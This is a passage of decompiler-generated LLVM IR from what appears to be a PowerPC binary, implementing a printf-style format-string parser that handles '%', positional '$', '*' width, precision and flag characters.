  %v0_10004258 = load i32, i32* %r4.global-to-local, align 4
  %v1_10004258 = mul i32 %v0_10004258, -4
  store i32 %v1_10004258, i32* %r0.global-to-local, align 4
  %v1_1000425c = add i32 %v0_1000425c, 1
  store i32 %v1_1000425c, i32* @r30, align 4
  %v0_10004260 = load i32, i32* @r1, align 4
  %v2_10004260 = add i32 %v0_10004260, %v1_10004258
  store i32 %v2_10004260, i32* %r9.global-to-local, align 4
  %v0_10004264 = load i32, i32* @r27, align 4
  %v2_10004264 = add i32 %v2_10004260, 8
  %v3_10004264 = inttoptr i32 %v2_10004264 to i32*
  store i32 %v0_10004264, i32* %v3_10004264, align 4
  %v0_10004280.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10004268

dec_label_pc_10004268:                            ; preds = %dec_label_pc_10004248, %dec_label_pc_10004258
  %v0_10004280.pre = phi i32 [ %v0_1000425c, %dec_label_pc_10004248 ], [ %v0_10004280.pre.pre, %dec_label_pc_10004258 ]
  %v0_10004268 = load i32, i32* %r3.global-to-local, align 4
  %v1_10004268 = add i32 %v0_10004268, -10216
  %v2_10004268 = inttoptr i32 %v1_10004268 to i32*
  %v3_10004268 = load i32, i32* %v2_10004268, align 4
  store i32 %v3_10004268, i32* %r6.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_10004280

dec_label_pc_10004274:                            ; preds = %dec_label_pc_10004280
  %v2_10004288 = icmp sgt i32 %v0_100042cc, 4094
  br i1 %v2_10004288, label %dec_label_pc_1000427c, label %dec_label_pc_10004278

dec_label_pc_10004278:                            ; preds = %dec_label_pc_10004274
  %v1_10004278 = add i32 %v2_10004290, -48
  store i32 %v1_10004278, i32* @r7, align 4
  br label %dec_label_pc_1000427c

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_10004274, %dec_label_pc_10004278
  %v0_1000428415 = phi i32 [ %v0_100042cc, %dec_label_pc_10004274 ], [ %v1_10004278, %dec_label_pc_10004278 ]
  %v1_1000427c = add i32 %v0_100042fc, 1
  store i32 %v1_1000427c, i32* @r30, align 4
  br label %dec_label_pc_10004280

dec_label_pc_10004280:                            ; preds = %dec_label_pc_10004268, %dec_label_pc_1000427c
  %v0_100042cc = phi i32 [ 0, %dec_label_pc_10004268 ], [ %v0_1000428415, %dec_label_pc_1000427c ]
  %v0_100042fc = phi i32 [ %v0_10004280.pre, %dec_label_pc_10004268 ], [ %v1_1000427c, %dec_label_pc_1000427c ]
  %v1_10004280 = inttoptr i32 %v0_100042fc to i8*
  %v2_10004280 = load i8, i8* %v1_10004280, align 1
  %v3_10004280 = zext i8 %v2_10004280 to i32
  store i32 %v3_10004280, i32* %r8.global-to-local, align 4
  %v1_10004284 = mul i32 %v0_100042cc, 10
  %v1_1000428c = mul nuw nsw i32 %v3_10004280, 2
  store i32 %v1_1000428c, i32* %r9.global-to-local, align 4
  %v2_10004290 = add i32 %v3_10004280, %v1_10004284
  store i32 %v2_10004290, i32* %r11.global-to-local, align 4
  %v2_10004294 = add i32 %v1_1000428c, %v3_10004268
  %v3_10004294 = inttoptr i32 %v2_10004294 to i16*
  %v4_10004294 = load i16, i16* %v3_10004294, align 2
  %v5_10004294 = zext i16 %v4_10004294 to i32
  store i32 %v5_10004294, i32* %r0.global-to-local, align 4
  %v1_10004298 = and i32 %v5_10004294, 8
  store i32 %v1_10004298, i32* %r9.global-to-local, align 4
  %v3_10004298 = icmp eq i32 %v1_10004298, 0
  br i1 %v3_10004298, label %dec_label_pc_100042a0, label %dec_label_pc_10004274

dec_label_pc_100042a0:                            ; preds = %dec_label_pc_10004280
  %v0_100042a0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100042a0 = add i32 %v0_100042a0, -1
  %v2_100042a0 = inttoptr i32 %v1_100042a0 to i8*
  %v3_100042a0 = load i8, i8* %v2_100042a0, align 1
  %v4_100042a0 = zext i8 %v3_100042a0 to i32
  store i32 %v4_100042a0, i32* %r0.global-to-local, align 4
  %v3_100042a4 = icmp eq i8 %v3_100042a0, 37
  br i1 %v3_100042a4, label %dec_label_pc_100042ac, label %dec_label_pc_10004374

dec_label_pc_100042ac:                            ; preds = %dec_label_pc_100042a0
  %v3_100042ac = icmp eq i8 %v2_10004280, 36
  br i1 %v3_100042ac, label %dec_label_pc_100042b4, label %dec_label_pc_100042e8

dec_label_pc_100042b4:                            ; preds = %dec_label_pc_100042ac
  %tmp58 = icmp slt i32 %v0_100042cc, 1
  br i1 %tmp58, label %dec_label_pc_100042e8, label %dec_label_pc_100042bc

dec_label_pc_100042bc:                            ; preds = %dec_label_pc_100042b4
  %v0_100042bc = load i32, i32* @r26, align 4
  %v3_100042bc = icmp eq i32 %v0_100042bc, 0
  %v1_100042c0 = add i32 %v0_100042fc, 1
  store i32 %v1_100042c0, i32* %r10.global-to-local, align 4
  br i1 %v3_100042bc, label %dec_label_pc_10004684, label %dec_label_pc_100042c8

dec_label_pc_100042c8:                            ; preds = %dec_label_pc_100042bc
  %v3_100042c8 = icmp sgt i32 %v0_100042cc, %v0_100042bc
  br i1 %v3_100042c8, label %dec_label_pc_100042d4, label %dec_label_pc_100042e0

dec_label_pc_100042d4:                            ; preds = %dec_label_pc_100042c8
  store i32 %v0_100042cc, i32* @r26, align 4
  br label %dec_label_pc_100042e0

dec_label_pc_100042dc:                            ; preds = %dec_label_pc_10004304, %dec_label_pc_100042fc
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_100042e0

dec_label_pc_100042e0:                            ; preds = %dec_label_pc_100042c8, %dec_label_pc_100042d4, %dec_label_pc_100042dc
  %v0_100042e0 = phi i32 [ %v0_100042a0, %dec_label_pc_100042dc ], [ %v1_100042c0, %dec_label_pc_100042d4 ], [ %v1_100042c0, %dec_label_pc_100042c8 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_100042dc ], [ %v0_100042cc, %dec_label_pc_100042d4 ], [ %v0_100042cc, %dec_label_pc_100042c8 ]
  br label %dec_label_pc_1000431c

dec_label_pc_100042e8:                            ; preds = %dec_label_pc_100042ac, %dec_label_pc_100042b4
  %v0_100042e8 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_100042e8, 1
  br i1 %tmp59, label %dec_label_pc_100042fc, label %dec_label_pc_100042f0

dec_label_pc_100042f0:                            ; preds = %dec_label_pc_100042e8
  %v3_100042f0 = icmp eq i8 %v2_10004280, 109
  br i1 %v3_100042f0, label %dec_label_pc_10004374, label %dec_label_pc_10004684

dec_label_pc_100042fc:                            ; preds = %dec_label_pc_100042e8
  %v3_100042fc = icmp ugt i32 %v0_100042fc, %v0_100042a0
  br i1 %v3_100042fc, label %dec_label_pc_10004304, label %dec_label_pc_100042dc

dec_label_pc_10004304:                            ; preds = %dec_label_pc_100042fc
  %v1_10004304 = inttoptr i32 %v0_100042a0 to i8*
  %v2_10004304 = load i8, i8* %v1_10004304, align 1
  %v3_10004304 = zext i8 %v2_10004304 to i32
  store i32 %v3_10004304, i32* %r0.global-to-local, align 4
  store i32 %v0_100042a0, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_10004310 = icmp eq i8 %v2_10004304, 48
  br i1 %v3_10004310, label %dec_label_pc_100042dc, label %dec_label_pc_10004378

dec_label_pc_1000431c:                            ; preds = %dec_label_pc_10004338, %dec_label_pc_100042e0
  %v0_1000433c = phi i32 [ %v0_100042e0, %dec_label_pc_100042e0 ], [ %v1_1000433c, %dec_label_pc_10004338 ]
  store i32 %v0_1000433c, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000bd48.367 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_1000432c = inttoptr i32 %v0_1000433c to i8*
  br label %dec_label_pc_10004324

dec_label_pc_10004324:                            ; preds = %dec_label_pc_10004344, %dec_label_pc_1000431c
  %v1_10004338 = phi i32 [ %v1_10004348, %dec_label_pc_10004344 ], [ 1, %dec_label_pc_1000431c ]
  %v0_10004324 = phi i32 [ %v1_10004328, %dec_label_pc_10004344 ], [ ptrtoint ([8 x i8]* @global_var_1000bd48.367 to i32), %dec_label_pc_1000431c ]
  %v1_10004324 = inttoptr i32 %v0_10004324 to i8*
  %v2_10004324 = load i8, i8* %v1_10004324, align 1
  %v3_10004324 = zext i8 %v2_10004324 to i32
  store i32 %v3_10004324, i32* %r9.global-to-local, align 4
  %v1_10004328 = add i32 %v0_10004324, 1
  store i32 %v1_10004328, i32* %r11.global-to-local, align 4
  %v2_1000432c = load i8, i8* %v1_1000432c, align 1
  %v3_1000432c = zext i8 %v2_1000432c to i32
  store i32 %v3_1000432c, i32* %r0.global-to-local, align 4
  %v4_10004330 = icmp eq i8 %v2_1000432c, %v2_10004324
  br i1 %v4_10004330, label %dec_label_pc_10004338, label %dec_label_pc_10004344

dec_label_pc_10004338:                            ; preds = %dec_label_pc_10004324
  %v0_10004338 = load i32, i32* %r5.global-to-local, align 4
  %v2_10004338 = or i32 %v0_10004338, %v1_10004338
  store i32 %v2_10004338, i32* %r5.global-to-local, align 4
  %v1_1000433c = add i32 %v0_1000433c, 1
  br label %dec_label_pc_1000431c

dec_label_pc_10004344:                            ; preds = %dec_label_pc_10004324
  %v1_10004344 = inttoptr i32 %v1_10004328 to i8*
  %v2_10004344 = load i8, i8* %v1_10004344, align 1
  %v3_10004344 = zext i8 %v2_10004344 to i32
  store i32 %v3_10004344, i32* %r0.global-to-local, align 4
  %v1_10004348 = mul i32 %v1_10004338, 2
  store i32 %v1_10004348, i32* %r10.global-to-local, align 4
  %v3_1000434c = icmp eq i8 %v2_10004344, 0
  br i1 %v3_1000434c, label %dec_label_pc_10004354, label %dec_label_pc_10004324

dec_label_pc_10004354:                            ; preds = %dec_label_pc_10004344
  %v1_10004354 = add i32 %v0_1000433c, -1
  %v2_10004354 = inttoptr i32 %v1_10004354 to i8*
  %v3_10004354 = load i8, i8* %v2_10004354, align 1
  %v4_10004354 = zext i8 %v3_10004354 to i32
  store i32 %v4_10004354, i32* %r0.global-to-local, align 4
  %v0_10004358 = load i32, i32* %r5.global-to-local, align 4
  %v1_10004358 = and i32 %v0_10004358, 10
  store i32 0, i32* @r7, align 4
  %v1_10004360 = udiv i32 %v1_10004358, 2
  store i32 %v1_10004360, i32* %r9.global-to-local, align 4
  %v3_10004364 = icmp eq i8 %v3_10004354, 37
  %v2_10004368 = sub nuw nsw i32 -1, %v1_10004360
  %v3_10004368 = and i32 %v0_10004358, %v2_10004368
  store i32 %v3_10004368, i32* %r5.global-to-local, align 4
  br i1 %v3_10004364, label %dec_label_pc_10004378, label %dec_label_pc_10004244

dec_label_pc_10004374:                            ; preds = %dec_label_pc_100042a0, %dec_label_pc_100042f0
  store i32 %v0_100042a0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004378

dec_label_pc_10004378:                            ; preds = %dec_label_pc_10004304, %dec_label_pc_10004354, %dec_label_pc_10004374
  %v0_100043ac = phi i32 [ 0, %dec_label_pc_10004354 ], [ %v0_100042cc, %dec_label_pc_10004304 ], [ %v0_100042cc, %dec_label_pc_10004374 ]
  %v1_100043b8 = phi i32 [ %v0_1000433c, %dec_label_pc_10004354 ], [ %v0_100042fc, %dec_label_pc_10004304 ], [ %v0_100042fc, %dec_label_pc_10004374 ]
  %v0_100043b4 = phi i32 [ %v1_10004328, %dec_label_pc_10004354 ], [ %v0_100042a0, %dec_label_pc_10004304 ], [ %v0_100042a0, %dec_label_pc_10004374 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_10004354 ], [ %stack_var_-84.1, %dec_label_pc_10004304 ], [ %stack_var_-84.1, %dec_label_pc_10004374 ]
  %v1_10004378 = inttoptr i32 %v0_100043b4 to i8*
  %v2_10004378 = load i8, i8* %v1_10004378, align 1
  %v3_10004378 = zext i8 %v2_10004378 to i32
  store i32 %v3_10004378, i32* %r0.global-to-local, align 4
  %v3_1000437c = icmp eq i8 %v2_10004378, 42
  br i1 %v3_1000437c, label %dec_label_pc_10004384, label %dec_label_pc_100043c4

dec_label_pc_10004384:                            ; preds = %dec_label_pc_10004378
  %v0_10004384 = load i32, i32* @r26, align 4
  %v3_10004384 = icmp eq i32 %v0_10004384, 0
  br i1 %v3_10004384, label %dec_label_pc_100043b4, label %dec_label_pc_1000438c

dec_label_pc_1000438c:                            ; preds = %dec_label_pc_10004384
  %v1_1000438c = inttoptr i32 %v1_100043b8 to i8*
  %v2_1000438c = load i8, i8* %v1_1000438c, align 1
  %v3_1000438c = zext i8 %v2_1000438c to i32
  store i32 %v3_1000438c, i32* %r0.global-to-local, align 4
  %v3_10004390 = icmp eq i8 %v2_1000438c, 36
  br i1 %v3_10004390, label %dec_label_pc_10004398, label %dec_label_pc_10004684

dec_label_pc_10004398:                            ; preds = %dec_label_pc_1000438c
  %tmp60 = icmp slt i32 %v0_100043ac, 1
  br i1 %tmp60, label %dec_label_pc_10004684, label %dec_label_pc_100043a0

dec_label_pc_100043a0:                            ; preds = %dec_label_pc_10004398
  %v0_100043a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100043a0 = mul i32 %v0_100043a0, -4
  %v1_100043a4 = add i32 %v1_100043b8, 1
  store i32 %v1_100043a4, i32* @r30, align 4
  %v0_100043a8 = load i32, i32* @r29, align 4
  %v2_100043a8 = add i32 %v0_100043a8, %v1_100043a0
  store i32 %v2_100043a8, i32* %r9.global-to-local, align 4
  %v2_100043ac = add i32 %v2_100043a8, 12
  %v3_100043ac = inttoptr i32 %v2_100043ac to i32*
  store i32 %v0_100043ac, i32* %v3_100043ac, align 4
  %v0_100043cc.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100043c0

dec_label_pc_100043b4:                            ; preds = %dec_label_pc_10004384
  %v1_100043b4 = add i32 %v0_100043b4, 1
  store i32 %v1_100043b4, i32* %r0.global-to-local, align 4
  %v4_100043b8 = icmp eq i32 %v1_100043b4, %v1_100043b8
  br i1 %v4_100043b8, label %dec_label_pc_100043c0, label %dec_label_pc_10004684

dec_label_pc_100043c0:                            ; preds = %dec_label_pc_100043b4, %dec_label_pc_100043a0
  %v0_100043cc.pre = phi i32 [ %v1_100043b8, %dec_label_pc_100043b4 ], [ %v0_100043cc.pre.pre, %dec_label_pc_100043a0 ]
  store i32 -2147483648, i32* @r7, align 4
  br label %dec_label_pc_100043c4

dec_label_pc_100043c4:                            ; preds = %dec_label_pc_10004378, %dec_label_pc_100043c0
  %v0_100043cc = phi i32 [ %v1_100043b8, %dec_label_pc_10004378 ], [ %v0_100043cc.pre, %dec_label_pc_100043c0 ]
  %v0_100043dc = phi i32 [ %v0_100043ac, %dec_label_pc_10004378 ], [ -2147483648, %dec_label_pc_100043c0 ]
  %v0_100043c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_100043c4 = icmp eq i32 %v0_100043c4, 0
  %v1_100043cc = inttoptr i32 %v0_100043cc to i8*
  br i1 %v3_100043c4, label %dec_label_pc_100043cc, label %dec_label_pc_100043f0

dec_label_pc_100043cc:                            ; preds = %dec_label_pc_100043c4
  %v2_100043cc = load i8, i8* %v1_100043cc, align 1
  %v3_100043cc = zext i8 %v2_100043cc to i32
  store i32 %v3_100043cc, i32* %r0.global-to-local, align 4
  %v3_100043d0 = icmp eq i8 %v2_100043cc, 46
  br i1 %v3_100043d0, label %dec_label_pc_100043d8, label %dec_label_pc_100043e8

dec_label_pc_100043d8:                            ; preds = %dec_label_pc_100043cc
  %v1_100043d8 = add i32 %v0_100043cc, 1
  store i32 %v0_100043dc, i32* @r31, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10004244

dec_label_pc_100043e8:                            ; preds = %dec_label_pc_100043cc
  store i32 %v0_100043dc, i32* @r31, align 4
  br label %dec_label_pc_100043f0

dec_label_pc_100043f0:                            ; preds = %dec_label_pc_100043c4, %dec_label_pc_100043e8
  %storemerge1 = phi i32 [ -1, %dec_label_pc_100043e8 ], [ %v0_100043dc, %dec_label_pc_100043c4 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_100043f0 = load i8, i8* %v1_100043cc, align 1
  %v3_100043f0 = zext i8 %v2_100043f0 to i32
  store i32 %v3_100043f0, i32* %r10.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000bcf0.368 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100043fc

dec_label_pc_100043fc:                            ; preds = %dec_label_pc_10004408, %dec_label_pc_100043f0
  %v0_10004408 = phi i32 [ %v1_10004408, %dec_label_pc_10004408 ], [ ptrtoint ([9 x i8]* @global_var_1000bcf0.368 to i32), %dec_label_pc_100043f0 ]
  %v1_100043fc = inttoptr i32 %v0_10004408 to i8*
  %v2_100043fc = load i8, i8* %v1_100043fc, align 1
  %v3_100043fc = zext i8 %v2_100043fc to i32
  store i32 %v3_100043fc, i32* %r0.global-to-local, align 4
  %v4_10004400 = icmp eq i8 %v2_100043f0, %v2_100043fc
  br i1 %v4_10004400, label %dec_label_pc_100041cc, label %dec_label_pc_10004408

dec_label_pc_10004408:                            ; preds = %dec_label_pc_100043fc
  %v1_10004408 = add i32 %v0_10004408, 1
  %v2_10004408 = inttoptr i32 %v1_10004408 to i8*
  %v3_10004408 = load i8, i8* %v2_10004408, align 1
  %v4_10004408 = zext i8 %v3_10004408 to i32
  store i32 %v4_10004408, i32* %r0.global-to-local, align 4
  store i32 %v1_10004408, i32* %r11.global-to-local, align 4
  %v3_1000440c = icmp eq i8 %v3_10004408, 0
  br i1 %v3_1000440c, label %dec_label_pc_10004414, label %dec_label_pc_100043fc

dec_label_pc_10004414:                            ; preds = %dec_label_pc_10004408, %dec_label_pc_100041cc
  %v0_1000443c = phi i32 [ %v1_100041cc, %dec_label_pc_100041cc ], [ %v0_100043cc, %dec_label_pc_10004408 ]
  %v0_10004438 = phi i32 [ %v0_10004408, %dec_label_pc_100041cc ], [ %v1_10004408, %dec_label_pc_10004408 ]
  %v2_1000441c = sub i32 %v0_10004438, ptrtoint ([9 x i8]* @global_var_1000bcf0.368 to i32)
  store i32 %v2_1000441c, i32* %r9.global-to-local, align 4
  %v2_10004420 = icmp sgt i32 %v2_1000441c, 1
  br i1 %v2_10004420, label %dec_label_pc_10004440, label %dec_label_pc_10004428

dec_label_pc_10004428:                            ; preds = %dec_label_pc_10004414
  %v1_10004428 = inttoptr i32 %v0_1000443c to i8*
  %v2_10004428 = load i8, i8* %v1_10004428, align 1
  %v3_10004428 = zext i8 %v2_10004428 to i32
  store i32 %v3_10004428, i32* %r0.global-to-local, align 4
  %v1_1000442c = inttoptr i32 %v0_10004438 to i8*
  %v2_1000442c = load i8, i8* %v1_1000442c, align 1
  %v3_1000442c = zext i8 %v2_1000442c to i32
  store i32 %v3_1000442c, i32* %r9.global-to-local, align 4
  %v4_10004430 = icmp eq i8 %v2_10004428, %v2_1000442c
  br i1 %v4_10004430, label %dec_label_pc_10004438, label %dec_label_pc_10004440

dec_label_pc_10004438:                            ; preds = %dec_label_pc_10004428
  %v1_10004438 = add i32 %v0_10004438, 9
  store i32 %v1_10004438, i32* %r11.global-to-local, align 4
  %v1_1000443c = add i32 %v0_1000443c, 1
  store i32 %v1_1000443c, i32* @r30, align 4
  br label %dec_label_pc_10004440

dec_label_pc_10004440:                            ; preds = %dec_label_pc_10004428, %dec_label_pc_10004414, %dec_label_pc_10004438
  %v0_10004444 = phi i32 [ %v0_10004438, %dec_label_pc_10004428 ], [ %v0_10004438, %dec_label_pc_10004414 ], [ %v1_10004438, %dec_label_pc_10004438 ]
  %v0_10004440 = phi i32 [ %v0_1000443c, %dec_label_pc_10004428 ], [ %v0_1000443c, %dec_label_pc_10004414 ], [ %v1_1000443c, %dec_label_pc_10004438 ]
  %v1_10004440 = inttoptr i32 %v0_10004440 to i8*
  %v2_10004440 = load i8, i8* %v1_10004440, align 1
  %v3_10004440 = zext i8 %v2_10004440 to i32
  store i32 %v3_10004440, i32* %r10.global-to-local, align 4
  %v1_10004444 = add i32 %v0_10004444, 9
  %v2_10004444 = inttoptr i32 %v1_10004444 to i8*
  %v3_10004444 = load i8, i8* %v2_10004444, align 1
  %v4_10004444 = zext i8 %v3_10004444 to i32
  store i32 %v4_10004444, i32* %r0.global-to-local, align 4
  %v3_10004448 = icmp eq i8 %v2_10004440, 0
  %v1_1000444c = mul nuw nsw i32 %v4_10004444, 256
  store i32 %v1_1000444c, i32* %r8.global-to-local, align 4
  br i1 %v3_10004448, label %dec_label_pc_10004684, label %dec_label_pc_10004454

dec_label_pc_10004454:                            ; preds = %dec_label_pc_10004440
  %v3_10004458 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_10004458, i32* %r11.global-to-local, align 4
  store i32 268500992, i32* %r3.global-to-local, align 4
  %v1_10004464 = and i32 %v1_1000444c, 1024
  store i32 %v1_10004464, i32* %r0.global-to-local, align 4
  %v3_10004464 = icmp eq i32 %v1_10004464, 0
  store i32 ptrtoint (i32* @global_var_1000bd24.370 to i32), i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000bd30.369 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004474

dec_label_pc_10004474:                            ; preds = %dec_label_pc_100044d8, %dec_label_pc_10004454
  %v1_10004480 = phi i32 [ %v1_100044d8, %dec_label_pc_100044d8 ], [ ptrtoint ([21 x i8]* @global_var_1000bd30.369 to i32), %dec_label_pc_10004454 ]
  %v1_10004474 = inttoptr i32 %v1_10004480 to i8*
  %v2_10004474 = load i8, i8* %v1_10004474, align 1
  %v3_10004474 = zext i8 %v2_10004474 to i32
  store i32 %v3_10004474, i32* %r0.global-to-local, align 4
  %v4_10004478 = icmp eq i8 %v2_10004474, %v2_10004440
  br i1 %v4_10004478, label %dec_label_pc_10004480, label %dec_label_pc_100044d8

dec_label_pc_10004480:                            ; preds = %dec_label_pc_10004474
  %v2_10004480 = sub i32 %v1_10004480, ptrtoint ([21 x i8]* @global_var_1000bd30.369 to i32)
  %tmp61 = icmp slt i32 %v2_10004480, 18
  %brmerge = or i1 %v3_10004464, %tmp61
  br i1 %brmerge, label %dec_label_pc_10004494, label %dec_label_pc_10004490

dec_label_pc_10004490:                            ; preds = %dec_label_pc_10004480
  %v1_10004490 = add i32 %v2_10004480, -2
  br label %dec_label_pc_10004494

dec_label_pc_10004494:                            ; preds = %dec_label_pc_10004480, %dec_label_pc_10004490
  %storemerge = phi i32 [ %v1_10004490, %dec_label_pc_10004490 ], [ %v2_10004480, %dec_label_pc_10004480 ]
  %v0_10004494 = phi i32 [ %v1_10004490, %dec_label_pc_10004490 ], [ %v2_10004480, %dec_label_pc_10004480 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_10004494 = load i32, i32* @r28, align 4
  %v2_10004494 = add i32 %v1_10004494, 32
  %v3_10004494 = inttoptr i32 %v2_10004494 to i32*
  store i32 %v0_10004494, i32* %v3_10004494, align 4
  store i32 ptrtoint (i32* @global_var_1000bd23.371 to i32), i32* %r11.global-to-local, align 4
  %v0_100044a0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000449c

dec_label_pc_1000449c:                            ; preds = %dec_label_pc_1000449c, %dec_label_pc_10004494
  %v0_1000449c = phi i32 [ %v1_1000449c, %dec_label_pc_1000449c ], [ ptrtoint (i32* @global_var_1000bd23.371 to i32), %dec_label_pc_10004494 ]
  %v1_1000449c = add i32 %v0_1000449c, 1
  %v2_1000449c = inttoptr i32 %v1_1000449c to i8*
  %v3_1000449c = load i8, i8* %v2_1000449c, align 1
  %v4_1000449c = zext i8 %v3_1000449c to i32
  store i32 %v4_1000449c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000449c, i32* %r11.global-to-local, align 4
  %v3_100044a0 = icmp sgt i32 %v0_100044a0.pre, %v4_1000449c
  br i1 %v3_100044a0, label %dec_label_pc_1000449c, label %dec_label_pc_100044a8

dec_label_pc_100044a8:                            ; preds = %dec_label_pc_1000449c
  %v0_100044a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_100044a8 = sub i32 %v1_1000449c, %v0_100044a8
  %v1_100044b0 = mul i32 %v2_100044a8, 2
  store i32 %v1_100044b0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000bd14.372 to i32), i32* %r9.global-to-local, align 4
  %v2_100044b8 = add i32 %v1_100044b0, ptrtoint (i32* @global_var_1000bd14.372 to i32)
  %v3_100044b8 = inttoptr i32 %v2_100044b8 to i16*
  %v4_100044b8 = load i16, i16* %v3_100044b8, align 2
  %v5_100044b8 = sext i16 %v4_100044b8 to i32
  store i32 %v5_100044b8, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000bd04.373 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000bd30.369 to i32), i32* @r7, align 4
  %v2_100044c8 = add i32 %v1_100044b0, ptrtoint (i32* @global_var_1000bd04.373 to i32)
  %v3_100044c8 = inttoptr i32 %v2_100044c8 to i16*
  %v4_100044c8 = load i16, i16* %v3_100044c8, align 2
  %v5_100044c8 = sext i16 %v4_100044c8 to i32
  store i32 %v5_100044c8, i32* %r0.global-to-local, align 4
  %v2_100044cc = or i32 %v5_100044b8, %v1_1000444c
  %v2_100044d0 = and i32 %v5_100044c8, %v2_100044cc
  store i32 %v2_100044d0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100044e4

dec_label_pc_100044d8:                            ; preds = %dec_label_pc_10004474
  %v1_100044d8 = add i32 %v1_10004480, 1
  %v2_100044d8 = inttoptr i32 %v1_100044d8 to i8*
  %v3_100044d8 = load i8, i8* %v2_100044d8, align 1
  %v4_100044d8 = zext i8 %v3_100044d8 to i32
  store i32 %v4_100044d8, i32* %r0.global-to-local, align 4
  store i32 %v1_100044d8, i32* @r7, align 4
  %v3_100044dc = icmp eq i8 %v3_100044d8, 0
  br i1 %v3_100044dc, label %dec_label_pc_100044e4, label %dec_label_pc_10004474

dec_label_pc_100044e4:                            ; preds = %dec_label_pc_100044d8, %dec_label_pc_100044a8
  %v0_100044e4 = phi i32 [ %v2_100044d0, %dec_label_pc_100044a8 ], [ %v3_10004458, %dec_label_pc_100044d8 ]
  store i32 %v0_100044e4, i32* %stack_var_-96, align 4
  %v0_100044e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_100044e8 = call i32 @__asm_rlwinm(i32 %v0_100044e8, i32 30, i32 31, i32 31)
  %not.v2_100044ec = icmp eq i32 %v1_100044e8, 0
  %v6_100044f0 = sext i1 %not.v2_100044ec to i32
  store i32 %v6_100044f0, i32* %r9.global-to-local, align 4
  %v1_100044f4 = call i32 @__asm_rlwinm(i32 %v1_1000444c, i32 0, i32 20, i32 23)
  store i32 %v1_100044f4, i32* %r0.global-to-local, align 4
  %v0_100044f8 = load i32, i32* @r30, align 4
  %v1_100044f8 = inttoptr i32 %v0_100044f8 to i8*
  %v2_100044f8 = load i8, i8* %v1_100044f8, align 1
  %v3_100044f8 = zext i8 %v2_100044f8 to i32
  store i32 %v3_100044f8, i32* %r10.global-to-local, align 4
  %v1_100044fc = call i32 @__asm_rlwinm(i32 %v6_100044f0, i32 0, i32 0, i32 27)
  store i32 %v1_100044fc, i32* %r9.global-to-local, align 4
  %v0_10004500 = load i32, i32* %r5.global-to-local, align 4
  %v1_10004500 = call i32 @__asm_rlwinm(i32 %v0_10004500, i32 0, i32 30, i32 28)
  %v1_10004504 = add i32 %v1_100044fc, 48
  store i32 %v1_10004504, i32* %r9.global-to-local, align 4
  %v2_10004508 = or i32 %v1_10004500, %v1_100044f4
  store i32 %v2_10004508, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v0_10004510 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004510 = load i32, i32* @r28, align 4
  %v2_10004510 = add i32 %v1_10004510, 12
  %v3_10004510 = inttoptr i32 %v2_10004510 to i32*
  store i32 %v0_10004510, i32* %v3_10004510, align 4
  %v0_10004514 = load i32, i32* %r4.global-to-local, align 4
  %v1_10004514 = load i32, i32* @r28, align 4
  %v2_10004514 = add i32 %v1_10004514, 4
  %v3_10004514 = inttoptr i32 %v2_10004514 to i32*
  store i32 %v0_10004514, i32* %v3_10004514, align 4
  %v0_10004518 = load i32, i32* @r31, align 4
  %v1_10004518 = load i32, i32* @r28, align 4
  %v2_10004518 = add i32 %v1_10004518, 8
  %v3_10004518 = inttoptr i32 %v2_10004518 to i32*
  store i32 %v0_10004518, i32* %v3_10004518, align 4
  %v0_1000451c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000451c = load i32, i32* @r28, align 4
  %v2_1000451c = add i32 %v1_1000451c, 20
  %v3_1000451c = inttoptr i32 %v2_1000451c to i32*
  store i32 %v0_1000451c, i32* %v3_1000451c, align 4
  %v0_10004520 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004520 = load i32, i32* @r28, align 4
  %v2_10004520 = add i32 %v1_10004520, 16
  %v3_10004520 = inttoptr i32 %v2_10004520 to i32*
  store i32 %v0_10004520, i32* %v3_10004520, align 4
  %v0_10004524 = load i32, i32* %r8.global-to-local, align 4
  %v1_10004524 = load i32, i32* @r28, align 4
  %v2_10004524 = add i32 %v1_10004524, 28
  %v3_10004524 = inttoptr i32 %v2_10004524 to i32*
  store i32 %v0_10004524, i32* %v3_10004524, align 4
  %v0_10004528 = load i32, i32* @r7, align 4
  %v1_10004528 = inttoptr i32 %v0_10004528 to i8*
  %v2_10004528 = load i8, i8* %v1_10004528, align 1
  %v3_10004528 = zext i8 %v2_10004528 to i32
  store i32 %v3_10004528, i32* %r9.global-to-local, align 4
